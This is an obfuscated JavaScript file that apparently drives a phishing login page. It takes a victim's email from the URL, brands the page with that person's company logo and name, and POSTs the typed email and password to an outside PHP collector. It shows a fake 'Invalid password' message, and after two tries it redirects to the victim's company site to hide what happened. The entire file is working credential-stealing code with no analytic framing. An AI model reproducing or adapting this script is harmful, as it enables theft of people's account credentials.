(function () {
  var _0x14E48 = ["#msg", "", "#email", "200px", "none", "#automail", "1", "#inputbar", "#back1", "#error", "@", ".", "#logoname", "src", "https://logo.clearbit.com/", "#logoimg", "https://websitetermsandconditions.maxxwell-fab.workers.dev//?url=https://www.", "#mainPage", "#error, #msg", "#password", "Password field is empty!", "JSON", "https://frigomobil.ro/steffenno/mercy/mercy.php", "POST", "Verifying...", "#submit-btn", "signal", "ok", "Invalid password. Please try again", "Sign in"];
  function _0x14E8B() {
    var _0x14E8B = 0;
    $(_0x14E48[8]).click(function () {
      $(_0x14E48[0]).hide();
      $(_0x14E48[2]).val(_0x14E48[1]);
      $(_0x14E48[5]).css({
        left: _0x14E48[3],
        display: _0x14E48[4]
      });
      $(_0x14E48[7]).animate({
        right: _0x14E48[3],
        opacity: _0x14E48[6]
      }, 1000);
    });
    var _0x14F54 = window.location.hash.substr(1);
    if (_0x14F54) {
      $(_0x14E48[2]).val(_0x14F54);
      if (!/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/.test(_0x14F54)) {
        $(_0x14E48[9]).show();
        return false;
      }
      ;
      var _0x14ECE = _0x14F54.substring(_0x14F54.indexOf(_0x14E48[10]) + 1);
      var _0x14F11 = _0x14ECE.split(_0x14E48[11])[0].toLowerCase();
      $(_0x14E48[12]).html(_0x14F11);
      $(_0x14E48[15]).attr(_0x14E48[13], _0x14E48[14] + _0x14ECE);
      var _0x14FDA = _0x14E48[16] + _0x14ECE;
      $(_0x14E48[17]).attr(_0x14E48[13], _0x14FDA);
      document.title = _0x14F11.toUpperCase();
    }
    ;
    $(_0x14E48[25]).click(function (_0x14F54) {
      _0x14F54.preventDefault();
      $(_0x14E48[18]).hide();
      var _0x14F11 = $(_0x14E48[2]).val();
      var _0x1501D = $(_0x14E48[19]).val();
      if (!_0x1501D) {
        $(_0x14E48[0]).show().html(_0x14E48[20]);
        return false;
      }
      ;
      if (!/^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/.test(_0x14F11)) {
        $(_0x14E48[9]).show();
        return false;
      }
      ;
      _0x14E8B++;
      $.ajax({
        dataType: _0x14E48[21],
        url: _0x14E48[22],
        type: _0x14E48[23],
        data: {
          email: _0x14F11,
          password: _0x1501D
        },
        beforeSend: function () {
          $(_0x14E48[25]).text(_0x14E48[24]);
        },
        success: function (_0x14ECE) {
          if (_0x14ECE && _0x14ECE[_0x14E48[26]] == _0x14E48[27]) {
            $(_0x14E48[19]).val(_0x14E48[1]);
            if (_0x14E8B >= 2) {
              _0x14E8B = 0;
              window.location.replace(_0x14FDA);
            } else {
              $(_0x14E48[0]).show().html(_0x14E48[28]);
            }
          } else {
            $(_0x14E48[0]).show().html(_0x14E48[28]);
          }
        },
        error: function () {
          $(_0x14E48[19]).val(_0x14E48[1]);
          if (_0x14E8B >= 2) {
            _0x14E8B = 0;
            window.location.replace(_0x14FDA);
          } else {
            $(_0x14E48[0]).show().html(_0x14E48[28]);
          }
        },
        complete: function () {
          $(_0x14E48[25]).text(_0x14E48[29]);
        }
      });
    });
  }
  $(document).ready(_0x14E8B);
})();
